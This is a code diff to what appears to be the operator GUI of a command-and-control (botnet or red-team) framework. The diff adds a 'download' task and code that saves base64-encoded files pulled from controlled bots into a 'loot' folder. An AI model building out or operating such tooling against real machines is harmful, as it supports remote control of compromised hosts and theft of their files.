@@ -1,6 +1,7 @@
 from PySide6.QtWidgets import QWidget,QCompleter,QFileDialog,QMessageBox
 from PySide6.QtGui import QIcon,QFont,QKeyEvent,QPalette,QColor
-from PySide6.QtCore import Qt
+from PySide6.QtCore import Qt,QThread
+from core.file_worker import FileWorker
 from core.util import PattayaPanelUtil
 from designer.ui_terminal import Ui_BotTerminalWidget
 import json
@@ -9,6 +10,9 @@ import socketio
 
 from service.socket_io_terminal import SocketIOTerminalClient
 import os
+import io
+import base64
+
 
 
 class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
@@ -53,11 +57,12 @@ QTextEdit {
 
         self.socket_io_client.server_ack_bot_not_allow_command.connect(self.update_bot_not_allow_command_error)
 
+        self.socket_io_client.server_ack_response_file.connect(self.start_file_download_thread)
 
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload',  'clear']
+        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload','download', 'clear']
         self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
         self.completer.setCompletionMode(QCompleter.InlineCompletion)
 
@@ -81,9 +86,18 @@ QTextEdit {
 
 
         self.bot_loot_terminal_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "terminal"))
+        self.bot_loot_download_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "download"))
 
 
         self.create_loot_dir()
+
+        self._file_download_worker_thread = QThread()
+        self._file_download_worker = FileWorker()
+
+        self._file_download_worker.moveToThread(self._file_download_worker_thread)
+        self._file_download_worker_thread.started.connect(self._file_download_worker.doWork)
+        self._file_download_worker.progress.connect(self.on_download_file_progress)
+        self._file_download_worker.finished.connect(self.on_download_file_finished)
     
 
     def create_loot_dir(self):
@@ -91,6 +105,8 @@ QTextEdit {
             os.makedirs(os.path.normpath(self.bot_loot_dir))
         if not os.path.exists(self.bot_loot_terminal_dir):
             os.makedirs(os.path.normpath(self.bot_loot_terminal_dir))
+        if not os.path.exists(self.bot_loot_download_dir):
+            os.makedirs(os.path.normpath(self.bot_loot_download_dir))
 
 
 
@@ -240,3 +256,20 @@ QTextEdit {
 
         if key == Qt.Key_Tab:
             self.bot_send_task_line_edit.setCursorPosition(len(self.bot_send_task_line_edit.text()))
+
+
+    def on_download_file_progress(self):
+        pass
+
+    def on_download_file_finished(self):
+        pass
+
+
+    def start_file_download_thread(self, file, filename):
+        # self._file_download_worker.setup_data(file, filename, self.bot_loot_download_dir)
+        # self._file_download_worker_thread.start()
+        self.create_loot_dir()
+        file_path = os.path.join(self.bot_loot_download_dir, filename)
+        decoded_bytes = PattayaPanelUtil.base64_file_decode(file)
+        with io.open(file_path, 'wb') as f:
+            f.write(decoded_bytes)
